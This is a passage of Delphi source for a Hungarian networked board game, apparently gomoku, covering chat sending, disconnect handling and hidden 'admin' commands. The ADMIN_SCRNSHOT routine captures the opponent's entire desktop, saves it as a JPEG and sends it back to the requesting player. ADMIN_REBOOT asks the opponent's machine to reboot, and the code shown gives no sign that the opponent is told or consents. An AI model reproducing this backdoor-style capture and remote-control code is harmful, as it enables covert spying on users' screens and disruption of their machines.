  if SockNo = -1 then
  begin
   Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel,',PChar(ProgramName),mb_Ok + mb_IconExclamation);
   Abort;
  end;
  Console('''' + txtConsole.Text + ''' k�ld�se');
  ServerSocket1.Socket.Connections[SockNo].SendText(txtConsole.Text);
  txtConsole.Clear;
 end
 else
  if ClientSocket1.Active then
  begin
   Console('''' + txtConsole.Text + ''' k�ld�se');
   ClientSocket1.Socket.SendText(txtConsole.Text);
   txtConsole.Clear;
  end
  else
   Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel.',PCHar(ProgramName),mb_Ok + mb_IconExclamation);

 Key := 0;

end;

procedure TForm1.ClientSocket1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
 Gaming := false;
 mnuConnect.Caption := 'Ellenf�l megad�sa';
 mnuTournament.Visible := true;
 Status('Az ellenf�llel megszakadt a kapcsolat');
end;

procedure TForm1.lstConsoleMouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
var lXPoint, lYPoint, lIndex: longint;
begin
 lXPoint := X;
 lYPoint := Y;

 lIndex := SendMessageA(lstConsole.Handle,lb_ItemFromPoint,0,(lYPoint * 65536)+lXPoint);
 if (lIndex >= 0) and (lIndex < lstConsole.Items.Count) then
  lstConsole.Hint := lstConsole.Items[lIndex]
 else
 begin
  lstConsole.Hint := '';
  Application.HideHint;
 end;
end;

procedure TForm1.Console(s: string);
begin
 lstConsole.Items.Add(s);
 lstConsole.ItemIndex := lstConsole.Items.Count - 1;
end;

procedure TForm1.cmdScreenshotClick(Sender: TObject);
var i, SockNo: integer;
begin
 if IAmTheServer then
 begin
  SockNo := -1;
  for i := 0 to ServerSocket1.Socket.ActiveConnections - 1 do
   if ServerSocket1.Socket.Connections[i].RemoteAddress = AmobaServer.AcceptedIP then
    SockNo := i;
  if SockNo = -1 then
  begin
   Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel!',PChar(ProgramName),mb_Ok + mb_IconExclamation);
   Abort;
  end;
  Console('''ADMIN_SCRNSHOT'' k�ld�se');
  ServerSocket1.Socket.Connections[SockNo].SendText('ADMIN_SCRNSHOT');
 end
 else
  if ClientSocket1.Active then
  begin
   Console('''ADMIN_SCRNSHOT'' k�ld�se');
   ClientSocket1.Socket.SendText('ADMIN_SCRNSHOT');
  end
  else
   Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel!',PChar(ProgramName),mb_Ok + mb_IconExclamation);
end;

procedure TForm1.CreateAndSendScreenshot;
var Jpeg1: TJpegImage;
begin
 imgAdmin.Width := Screen.Width;
 imgAdmin.Height := Screen.Height;

 BitBlt(imgAdmin.Canvas.Handle,1,1,Screen.Width,Screen.Height,GetDC(0),1,1,srcCopy);

 Jpeg1 := TJpegImage.Create;
 Jpeg1.Assign(imgAdmin.Picture.Graphic);
 Jpeg1.CompressionQuality := 75;
 Jpeg1.SaveToFile('C:\temp_.jpg');
 Jpeg1.Free;

 imgAdmin.Width := 10;
 imgAdmin.Height := 10;
 ClientSocket2.Address := AmobaServer.AcceptedIP;

 try
  ClientSocket2.Active := true;
  ClientSocket2.Socket.SendStreamThenDrop(TFileStream.Create('C:\temp_.jpg',fmOpenRead or fmShareDenyNone));
 except
  Console('Hiba a screenshot elk�ld�se k�zben');
 end;
end;

procedure TForm1.ServerSocket2ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var stream: TMemoryStream;
    nReceived: integer;
    Jpeg1: TJpegImage;
begin
 Console('Screenshot �rkezik');

 with TFormBmp.Create(Application) do
 begin
  stream := TMemoryStream.Create;
  Screen.Cursor := crHourGlass;
  try
   while True do
   begin
    nReceived := Socket.ReceiveBuf(Buffer,SizeOf(Buffer));
    if nReceived <= 0 then
     Break
    else
     stream.Write(Buffer,nReceived);
    Sleep(200);
   end;
   stream.Position := 0;
   stream.SaveToFile('C:\temp.jpg');
   Jpeg1 := TJpegImage.Create;
   Jpeg1.LoadFromStream(stream);
   Image1.Picture.Assign(Jpeg1);
  finally
   stream.Free;
   Screen.Cursor := crDefault;
  end;
  Show;
 end;
 Socket.Close;

 Console('A screenshot meg�rkezett');
end;

procedure TForm1.mnuTournamentClick(Sender: TObject);
begin
 Form2.Show;
end;

procedure TForm1.cmdRebootClick(Sender: TObject);
var i, SockNo: integer;
begin
 if IAmTheServer then
 begin
  SockNo := -1;
  for i := 0 to ServerSocket1.Socket.ActiveConnections - 1 do
   if ServerSocket1.Socket.Connections[i].RemoteAddress = AmobaServer.AcceptedIP then
    SockNo := i;
  if SockNo = -1 then
  begin
   Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel!',PChar(ProgramName),mb_Ok + mb_IconExclamation);
   Abort;
  end;
  Console('''ADMIN_REBOOT'' k�ld�se');
  ServerSocket1.Socket.Connections[SockNo].SendText('ADMIN_REBOOT');
 end
 else
 begin
  Console('''ADMIN_REBOOT'' k�ld�se');
  ClientSocket1.Socket.SendText('ADMIN_REBOOT');
 end;
end;

end.
